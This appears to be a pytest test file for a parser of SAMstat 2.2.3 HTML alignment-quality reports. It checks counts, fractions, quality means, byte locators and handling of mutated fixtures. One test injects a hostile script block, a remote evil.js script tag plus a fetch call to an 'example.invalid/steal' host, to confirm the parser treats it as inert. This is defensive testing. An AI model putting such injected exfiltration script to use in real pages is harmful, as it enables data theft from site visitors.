"""Pinned native2.2.3 measurements plus explicitly mutated negative fixtures."""
from copy import deepcopy
from functools import lru_cache
import hashlib
import json
from pathlib import Path
import re

import pytest

from gene_annotation_episode.bvbrc_fastqutils_contracts import FastqUtilsContractError, validate_native_document
from gene_annotation_episode.bvbrc_fastqutils_samstat_legacy import parse_samstat_html_2_2_3

FIXTURES = Path(__file__).parent / 'fixtures/bvbrc_fastqutils_samstat_legacy'


def context(raw, *, version=None, transfer='complete', fmt='samstat_html', identity='handcrafted_synthetic'):
    return {'analysis_id': 'samstat_legacy_test', 'document_id': 'report', 'task_ref': 'task:test',
        'content': {'source_ref': 'source:test', 'artifact_field': 'artifact_ref', 'artifact_ref': 'content:test',
                    'sha256': hashlib.sha256(raw).hexdigest(), 'byte_count': len(raw)},
        'native_name': 'unaltered-label-only.html', 'declared_format': fmt, 'producer_version': version,
        'transfer_scope': transfer, 'identity': identity}


def parse(raw, **kwargs):
    return parse_samstat_html_2_2_3(raw, context=context(raw, **kwargs))


@lru_cache(maxsize=None)
def native(name):
    return parse((FIXTURES / name).read_bytes(), identity='source_executed_synthetic')


def cells(doc, metric, *, mate=None, block=None):
    populations = {p['id']: p for p in doc['populations']}
    return [c for c in doc['cells'] if c['metric'] == metric and
        (mate is None or populations[c['population_ref']]['population_ordinal'] == mate) and
        (block is None or c['locator']['block'] == block)]


def values(doc, metric, **kwargs):
    return [c['value'] for c in cells(doc, metric, **kwargs)]


@pytest.mark.parametrize('name', sorted(str(p.relative_to(FIXTURES)) for p in FIXTURES.rglob('*.html')))
def test_all_retained_native_reports_have_complete_content_bound_readers(name):
    doc = native(name)
    raw = (FIXTURES / name).read_bytes()
    validate_native_document(doc)
    assert doc['parse_scope'] == 'complete'
    assert doc['artifact']['actual_format'] == 'samstat_html_2_2_3'
    assert doc['artifact']['declared_format'] == 'samstat_html'
    assert doc['artifact']['producer_version'] == '2.2.3'
    assert doc['artifact']['sha256'] == hashlib.sha256(raw).hexdigest()
    assert not doc['categories'] and not doc['sequence_records'] and not doc['alignment_records']
    assert not doc['native_lineage'] and not doc['reference_dictionary']
    for cell in doc['cells']:
        loc = cell['locator']
        assert raw[loc['byte_start']:loc['byte_end']].decode('utf-8') == cell['native_token']
    # Independently enumerate every literal native y/error array, including
    # hidden groups. The parser must preserve its entire row order and x labels.
    for match in re.finditer(rb'var ([A-Za-z0-9_]+)  = \{\nx: \[(.*?)\],\ny: \[(.*?)\],(.*?)\n\};', raw, re.S):
        variable = match[1].decode()
        axis_labels = [item.strip('"') for item in match[2].decode().split(',')]
        payloads = [('y', match[3])]
        sem = re.search(rb'array : \[(.*?)\]', match[4], re.S)
        if sem:
            payloads.append(('error_y.array', sem[1]))
        for field, payload in payloads:
            retained = [c for c in doc['cells'] if c['locator']['block'] == variable and c['locator']['field'] == field]
            assert [c['native_token'] for c in retained] == payload.decode().split(',')
            assert [c['axis']['label'] for c in retained] == axis_labels
            assert [c['locator']['row_ordinal'] for c in retained] == list(range(len(axis_labels)))
    assert all(p['quality_encoding'] == 'unknown' and not p['member_record_refs'] for p in doc['populations'])
    assert all(p['scope'] == ('partial' if name.endswith('peek10001.sam.samstat.html') else 'unknown') for p in doc['populations'])


@pytest.mark.parametrize('name', ['mixed.sam.samstat.html', 'mixed.bam.samstat.html'])
def test_mapping_keeps_native_counts_mates_total_and_five_decimal_fractions(name):
    doc = native(name)
    assert values(doc, 'samstat_alignment_bin_count', mate=1) == [5, 2, 2, 1]
    assert values(doc, 'samstat_alignment_bin_count', mate=2) == [0, 1, 0, 0]
    assert values(doc, 'samstat_alignment_total_count', mate=0) == [11]
    assert values(doc, 'samstat_alignment_total_count', mate=1) == [10]
    assert values(doc, 'samstat_alignment_total_count', mate=2) == [1]
    assert values(doc, 'samstat_reported_bin_fraction', mate=1) == [.5, .2, .2, .1, 1.]
    assert cells(doc, 'samstat_reported_bin_fraction', mate=1)[0]['native_token'] == '0.50000'
    high = cells(doc, 'samstat_alignment_bin_count', mate=1)[0]
    assert high['axis'] == {'kind': 'mapq', 'label': 'MAPQ gt 30', 'lower': 30, 'upper': 255}
    assert 'samstat_mapq255_merged' in high['diagnostic_codes']
    # The source's supplementary record contributes; its secondary does not.
    assert sum(values(doc, 'samstat_alignment_bin_count')) == 11
    mates = {p['population_ordinal']: p for p in doc['populations'] if p['population_key'] == 'samstat_report_records'}
    assert mates[2]['id'] in mates[1]['disjoint_from_refs']
    assert mates[0]['id'] in mates[1]['parent_population_refs']
    assert mates[0]['id'] not in mates[1]['disjoint_from_refs']


def test_empty_zero_count_and_undefined_native_nan_are_distinct():
    doc = native('empty.sam.samstat.html')
    assert values(doc, 'samstat_alignment_bin_count') == [0, 0, 0, 0]
    fractions = cells(doc, 'samstat_reported_bin_fraction')
    assert len(fractions) == 5
    assert all(c['state'] == 'undefined' and c['value'] is None and c['native_token'] == '-nan' for c in fractions)
    assert all({'zero_denominator', 'nonfinite_native'} <= set(c['diagnostic_codes']) for c in fractions)
    assert not cells(doc, 'samstat_length_density')
    json.dumps(doc, allow_nan=False)


def test_exact_report_total_does_not_repair_rounded_pair_flags():
    doc = native('precision/paired1002.sam.samstat.html')
    assert values(doc, 'samstat_alignment_total_count', mate=0) == [1002]
    for metric in ('samstat_paired_flag_record_count_display', 'samstat_proper_pair_flag_record_count_display'):
        cell, = cells(doc, metric)
        assert (cell['value'], cell['native_token'], cell['precision'], cell['unit']) == (1000, '1K', 'native_rounded', 'alignment_records')
        assert cell['section_key'] == 'samstat_pair_flags'
    assert values(doc, 'samstat_paired_flag_percent') == [100.0]
    assert values(doc, 'samstat_proper_pair_flag_percent') == [100.0]
    small, = cells(native('mixed.sam.samstat.html'), 'samstat_paired_flag_record_count_display')
    assert (small['value'], small['precision']) == (2, 'exact_for_retained_population')


def test_native_sam_quality_mean_sem_and_zero_coverage_unknown():
    doc = native('boundaries/quality_pair.sam.samstat.html')
    assert values(doc, 'samstat_legacy_mean_phred') == [20.]
    assert values(doc, 'samstat_legacy_phred_sem') == [14.142136]
    assert cells(doc, 'samstat_legacy_phred_sem')[0]['unit'] == 'phred_deviation'
    assert not cells(native('missing_quality.sam.samstat.html'), 'samstat_legacy_mean_phred')
    zeros = [c for c in cells(native('mixed.sam.samstat.html'), 'samstat_legacy_mean_phred') if c['value'] == 0]
    assert zeros and all(c['state'] == 'available' and 'samstat_quality_coverage_unproven' in c['diagnostic_codes'] for c in zeros)


def test_fastx_keeps_native_quality_index_defect_without_alignment_outcomes():
    doc = native('qualities.fastq.samstat.html')
    assert values(doc, 'samstat_sequence_total_count') == [2]
    assert values(doc, 'samstat_legacy_quality_index_mean') == [37., 41., 41., 41., 41.]
    assert values(doc, 'samstat_legacy_quality_index_sem') == [2.828427, 0., 0., 0., 0.]
    assert not cells(doc, 'samstat_legacy_mean_phred')
    assert not cells(doc, 'samstat_alignment_bin_count')
    assert all(p['population_key'] == 'samstat_report_sequences' for p in doc['populations'])
    assert all('samstat_fastx_quality_offset_defect' in c['diagnostic_codes'] for c in cells(doc, 'samstat_legacy_quality_index_mean'))
    for symbol, expected in {'A': [2, 1, 0, 0, 0], 'C': [0, 1, 1, 0, 0], 'G': [0, 0, 1, 1, 0], 'T': [0, 0, 0, 1, 1], 'N': [0, 0, 0, 0, 1]}.items():
        assert values(doc, 'samstat_base_' + symbol + '_count') == expected


def test_lengths_are_densities_and_preserve_native_softclip_trimmed_coordinates():
    doc = native('lengths.fastq.samstat.html')
    density = cells(doc, 'samstat_length_density')
    assert [c['value'] for c in density] == [.090324, .169574]
    assert [c['axis']['lower'] for c in density] == [4., 8.]
    assert all(c['unit'] == 'inverse_bp' and c['meaning'] == 'native_estimate' for c in density)
    mixed = native('mixed.sam.samstat.html')
    assert [c['axis']['lower'] for c in cells(mixed, 'samstat_length_density', block='len_R1__MAPQ_lt_30')] == [6., 7.]
    singleton = cells(mixed, 'samstat_length_density', block='len_R2__MAPQ_lt_30')
    assert len(singleton) == 1 and singleton[0]['value'] == 1
    assert 'native_fallback_value' in singleton[0]['diagnostic_codes']


def test_clustered_native_means_do_not_become_counts_or_closed_intervals():
    doc = native('long_binned.fastq.samstat.html')
    assert not cells(doc, 'samstat_base_A_count')
    row = next(c for c in cells(doc, 'samstat_base_A_rounded_bin_mean') if c['axis']['label'] == '250-255')
    assert row['value'] == 1 and row['unit'] == 'scaled_native_count'
    assert row['axis'] == {'kind': 'native_label', 'label': '250-255', 'lower': None, 'upper': None}
    assert cells(doc, 'samstat_base_A_rounded_bin_mean')[0]['axis']['label'] == '0'


def test_optional_axes_and_sparse_series_are_preserved():
    doc = native('optional/qualities.fastq.samstat.html')
    end = [c for c in cells(doc, 'samstat_base_A_count') if c['section_key'] == 'samstat_base_end']
    relative = [c for c in cells(doc, 'samstat_base_A_count') if c['section_key'] == 'samstat_base_relative']
    assert end[0]['axis'] == {'kind': 'base_offset_from_end_0', 'label': '1', 'lower': 0, 'upper': 0}
    assert relative[0]['axis'] == {'kind': 'read_fraction_bin_0_100', 'label': '1', 'lower': 0., 'upper': .01}
    assert any(c['section_key'] == 'samstat_quality_relative' for c in cells(doc, 'samstat_legacy_quality_index_mean'))
    # A group omitted by SAMstat is absent; native visible:false groups survive.
    mixed = native('mixed.sam.samstat.html')
    assert not cells(mixed, 'samstat_base_N_count', block='bc_R1_MAPQ_gt_30_N')
    assert values(mixed, 'samstat_base_A_count', block='bc_R1_MAPQ_lt_10_A') == [2, 1, 0, 0, 0]


def test_indels_are_openings_not_gap_bases_and_defects_remain_qualified():
    doc = native('errors.sam.samstat.html')
    assert sum(values(doc, 'samstat_insertion_open_count')) == 1
    assert sum(values(doc, 'samstat_deletion_open_count')) == 1
    for metric in ('samstat_insertion_open_count', 'samstat_deletion_open_count', 'samstat_mismatch_A_count'):
        assert all('samstat_softclip_reconstruction_defect' in c['diagnostic_codes'] for c in cells(doc, metric))


def test_prefix_is_native_10000_chunk_and_report_closure_does_not_prove_input_completeness():
    doc = native('boundaries/peek10001.sam.samstat.html')
    assert values(doc, 'samstat_alignment_total_count') == [10000]
    assert all(c['state'] == 'available' for c in doc['cells'])
    assert any('first 10000 reads only' in row['value'] for row in doc['labels'])
    malformed = native('malformed_after_record.sam.samstat.html')
    assert values(malformed, 'samstat_alignment_total_count') == [1]
    assert all(p['scope'] == 'unknown' for p in malformed['populations'])
    assert 'samstat_input_scope_unproven' in {d['code'] for d in malformed['diagnostics']}


@pytest.mark.parametrize('replacement', [
    (b'y: [5,2,2,2,2,0,0,0]', b'y: [5,2]'),
    (b'name: \'A\'', b'name: \'C\''),
    (b'x: ["1","2","3","4","5","6","7","8"]', b'x: ["1","2","2","4","5","6","7","8"]'),
    (b'error_y: {\ntype: \'data\',\narray : [0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000]', b'error_y: {\ntype: \'data\',\narray : [0.000000]'),
    (b'y: [5,2,2,2,2,0,0,0],', b'y: [5,2,2,2,2,0,0,0], y: [1],'),
])
def test_malformed_series_preserve_valid_siblings_and_table(replacement):
    raw = (FIXTURES / 'mixed.sam.samstat.html').read_bytes().replace(*replacement, 1)
    doc = parse(raw)
    assert doc['parse_scope'] == 'partial'
    assert values(doc, 'samstat_alignment_bin_count', mate=1) == [5, 2, 2, 1]
    assert values(doc, 'samstat_base_T_count', block='bc_R2_MAPQ_lt_30_T') == [0, 0, 0, 1]
    assert any(s['state'] == 'malformed' for s in doc['sections'])


@pytest.mark.parametrize('suffix', [
    b'\nvar len_R1__MAPQ_gt_30 = {x:["1"],y:[999],name:"MAPQ gt 30"};\n',
    b'\nlen_R1__MAPQ_gt_30 = {x:["1"],y:[999],name:"MAPQ gt 30"};\n',
    b'\nlen_R1__MAPQ_gt_30.y = [999];\n',
])
def test_duplicate_or_mutated_variable_is_never_last_assignment_wins(suffix):
    raw = (FIXTURES / 'mixed.sam.samstat.html').read_bytes().replace(b'</body>', b'<script>' + suffix + b'</script></body>')
    doc = parse(raw)
    assert not cells(doc, 'samstat_length_density', block='len_R1__MAPQ_gt_30')
    assert cells(doc, 'samstat_length_density', block='len_R1__MAPQ_lt_30')
    assert 'selection_ambiguous' in {d['code'] for d in doc['diagnostics']}


def test_duplicate_data_reference_and_missing_reference_are_not_silent():
    raw = (FIXTURES / 'mixed.sam.samstat.html').read_bytes()
    changed = raw.replace(b'var len_R1_data = [len_R1__MAPQ_gt_30,', b'var len_R1_data = [len_R1__MAPQ_gt_30,len_R1__MAPQ_gt_30,')
    doc = parse(changed)
    assert doc['parse_scope'] == 'partial'
    assert not cells(doc, 'samstat_length_density', block='len_R1__MAPQ_gt_30')
    changed = re.sub(rb'var len_R1__MAPQ_gt_30  = \{.*?\};\n', b'', raw, count=1, flags=re.S)
    doc = parse(changed)
    assert doc['parse_scope'] == 'partial'
    assert cells(doc, 'samstat_length_density', block='len_R1__MAPQ_lt_30')


def test_truncated_script_keeps_complete_table_columns_and_valid_siblings():
    raw = (FIXTURES / 'mixed.sam.samstat.html').read_bytes()
    truncated = raw[:raw.index(b'var mappingtable_data')]
    doc = parse(truncated)
    assert doc['parse_scope'] == 'partial'
    assert values(doc, 'samstat_alignment_bin_count', mate=1) == [5, 2, 2, 1]
    assert values(doc, 'samstat_alignment_bin_count', mate=2) == [0, 1, 0, 0]
    assert all(c['state'] == 'available' for c in doc['cells'])
    assert any(r['required_data'] == 'complete_native_bytes' for r in doc['requirements'])


def test_partial_transfer_does_not_reprice_native_literals_or_claim_full_population():
    raw = (FIXTURES / 'mixed.sam.samstat.html').read_bytes()
    doc = parse(raw, transfer='partial')
    assert doc['parse_scope'] == 'partial'
    assert values(doc, 'samstat_alignment_bin_count', mate=1) == [5, 2, 2, 1]
    assert all(c['state'] == 'available' for c in doc['cells'])
    assert all(p['scope'] == 'unknown' for p in doc['populations'])


def test_malicious_scripts_strings_and_remote_urls_are_inert(monkeypatch, tmp_path):
    import socket
    import subprocess
    monkeypatch.setattr(socket, 'socket', lambda *a, **kw: pytest.fail('network request'))
    monkeypatch.setattr(subprocess, 'Popen', lambda *a, **kw: pytest.fail('subprocess execution'))
    raw = (FIXTURES / 'mixed.sam.samstat.html').read_bytes()
    attack = b'''<script src="https://example.invalid/evil.js"></script><script>
fetch('https://example.invalid/steal');
var evil = "var mappingtableval = [[999]]";
function never_run() { var mappingtableval = [[999]]; }
var lazy = function () { var mappingtableval = [[999]]; };
/* var mappingtableval = [[999]]; */
</script>'''
    doc = parse(raw.replace(b'</body>', attack + b'</body>'))
    assert values(doc, 'samstat_alignment_bin_count', mate=1) == [5, 2, 2, 1]
    assert not list(tmp_path.iterdir())
    assert any(b'fetch(' in raw_part for raw_part in [
        raw.replace(b'</body>', attack + b'</body>')[r['locator']['byte_start']:r['locator']['byte_end']]
        for r in doc['raw_blocks'] if r['kind'] == 'unsupported_section'])


@pytest.mark.parametrize('native_version,supplied', [('9.9.9', None), ('2.2.3', '2.5.0'), ('2.5.0', '2.2.3')])
def test_wrong_and_conflicting_versions_do_not_speculate(native_version, supplied):
    raw = (FIXTURES / 'mixed.sam.samstat.html').read_bytes().replace(b'version 2.2.3', b'version ' + native_version.encode())
    doc = parse(raw, version=supplied)
    assert doc['parse_scope'] == 'unsupported' and not doc['cells'] and not doc['populations']
    assert doc['artifact']['actual_format'] == 'unknown' and doc['artifact']['producer_version'] is None
    assert native_version in [r['value'] for r in doc['labels']]
    assert any(r['required_data'] == 'supported_parser' for r in doc['requirements'])


def test_utf8_byte_locators_and_html_entity_spelling_are_exact():
    raw = (FIXTURES / 'mixed.sam.samstat.html').read_bytes().replace(b'<h1>mixed.sam</h1>', '<h1>\u03b2 &amp; sample.sam</h1>'.encode())
    doc = parse(raw)
    assert any(r['value'] == '\u03b2 & sample.sam' for r in doc['labels'])
    for c in doc['cells']:
        loc = c['locator']
        assert raw[loc['byte_start']:loc['byte_end']].decode() == c['native_token']


def test_bad_content_binding_and_wrong_context_are_contract_errors():
    raw = (FIXTURES / 'empty.sam.samstat.html').read_bytes()
    ctx = context(raw)
    ctx['content']['sha256'] = '0' * 64
    with pytest.raises(FastqUtilsContractError, match='binding_conflict'):
        parse_samstat_html_2_2_3(raw, context=ctx)
    with pytest.raises(FastqUtilsContractError, match='shape_invalid'):
        parse(raw, fmt='bam_1')
    with pytest.raises(FastqUtilsContractError, match='shape_invalid'):
        parse_samstat_html_2_2_3(raw, context={})


def test_optional_missing_qual_native_defect_is_retained_and_not_repaired():
    doc = native('additional/missing_quality.sam.samstat.html')
    mean = cells(doc, 'samstat_legacy_mean_phred')
    assert not [c for c in mean if c['section_key'] == 'samstat_quality_start']
    assert [c['value'] for c in mean if c['section_key'] == 'samstat_quality_end'] == [41.] * 4
    relative = [c for c in mean if c['section_key'] == 'samstat_quality_relative']
    assert [(c['axis']['label'], c['value']) for c in relative if c['value']] == [('1', 41.), ('26', 41.), ('51', 41.), ('76', 41.)]
    assert all('samstat_quality_coverage_unproven' in c['diagnostic_codes'] for c in mean)


def test_seven_native_clustered_error_means_retain_distinct_metrics():
    doc = native('additional/clustered_errors.sam.samstat.html')
    prefixes = ['samstat_mismatch_' + base for base in 'ACGTN'] + ['samstat_insertion_open', 'samstat_deletion_open']
    for prefix in prefixes:
        rows = cells(doc, prefix + '_rounded_bin_mean')
        assert rows and sum(c['value'] for c in rows) == 1
        assert not cells(doc, prefix + '_count')
        assert all(c['axis']['kind'] == 'native_label' and c['axis']['lower'] is None for c in rows)
        assert all(c['precision'] == 'native_rounded' and c['unit'] == 'scaled_native_count' for c in rows)
    # The native terminal cluster for this302-bp input has no label at all.
    # Its values stay attached to the source row with unknown coordinates.
    unlabeled = [c for c in doc['cells'] if c['axis']['label'] == '']
    assert len(unlabeled) == 7
    assert all(c['axis']['lower'] is None and c['axis']['upper'] is None and c['state'] == 'available' for c in unlabeled)
    assert all('missing_requested_value' in c['diagnostic_codes'] for c in unlabeled)


def test_all_five_unclustered_mismatch_symbols_and_indel_openings_are_native_counts():
    doc = native('additional/short_errors.sam.samstat.html')
    prefixes = ['samstat_mismatch_' + base for base in 'ACGTN'] + ['samstat_insertion_open', 'samstat_deletion_open']
    for prefix in prefixes:
        rows = cells(doc, prefix + '_count')
        assert rows and sum(c['value'] for c in rows) == 1
        assert all(c['axis']['kind'] == 'base_closed_1' and c['precision'] == 'exact_for_retained_population' for c in rows)
        assert not cells(doc, prefix + '_rounded_bin_mean')


@pytest.mark.parametrize('old,new', [
    (b"label: 'MAPQ gt 30'", b"label: 'Unmapped'"),
    (b"type: 'data',", b"type: 'percent',"),
])
def test_group_legend_and_error_kind_conflicts_preserve_other_sections(old, new):
    raw = (FIXTURES / 'mixed.sam.samstat.html').read_bytes().replace(old, new, 1)
    doc = parse(raw)
    assert doc['parse_scope'] == 'partial'
    assert 'native_header_conflict' in {d['code'] for d in doc['diagnostics']}
    assert values(doc, 'samstat_alignment_bin_count', mate=1) == [5, 2, 2, 1]


def test_malformed_r2_column_keeps_valid_r1_with_original_header():
    raw = (FIXTURES / 'mixed.sam.samstat.html').read_bytes().replace(b',[0,1,0,0,1],[0.00000,1.00000,0.00000,0.00000,1.00000]\n]', b',[0,1,0\n]')
    doc = parse(raw)
    assert doc['parse_scope'] == 'partial'
    assert values(doc, 'samstat_alignment_bin_count', mate=1) == [5, 2, 2, 1]
    assert not cells(doc, 'samstat_alignment_bin_count', mate=2)


def test_nonfinite_fraction_with_nonzero_count_does_not_invent_zero_denominator():
    raw = (FIXTURES / 'mixed.sam.samstat.html').read_bytes().replace(b'0.50000', b'-nan', 1)
    cell = cells(parse(raw), 'samstat_reported_bin_fraction', mate=1)[0]
    assert cell['state'] == 'undefined' and cell['value'] is None
    assert 'nonfinite_native' in cell['diagnostic_codes'] and 'zero_denominator' not in cell['diagnostic_codes']


def test_unknown_native_group_stays_retained_with_supported_parser_requirement():
    raw = (FIXTURES / 'mixed.sam.samstat.html').read_bytes().replace(b'len_R1__MAPQ_gt_30', b'len_R1__FutureMAPQ')
    doc = parse(raw)
    assert doc['parse_scope'] == 'partial'
    assert any(r['native_name'] == 'len_R1__FutureMAPQ' for r in doc['raw_blocks'])
    assert any(r['required_data'] == 'supported_parser' for r in doc['requirements'])
    assert values(doc, 'samstat_alignment_bin_count', mate=1) == [5, 2, 2, 1]


def test_parser_uses_supplied_bytes_offline_and_saved_document_keeps_all_cells(monkeypatch):
    raw = (FIXTURES / 'mixed.sam.samstat.html').read_bytes()
    monkeypatch.setattr(Path, 'read_bytes', lambda *a, **kw: pytest.fail('filesystem acquisition'))
    monkeypatch.setattr(Path, 'read_text', lambda *a, **kw: pytest.fail('filesystem acquisition'))
    doc = parse(raw)
    saved = json.loads(json.dumps(doc, allow_nan=False))
    assert saved == doc
    validate_native_document(saved)
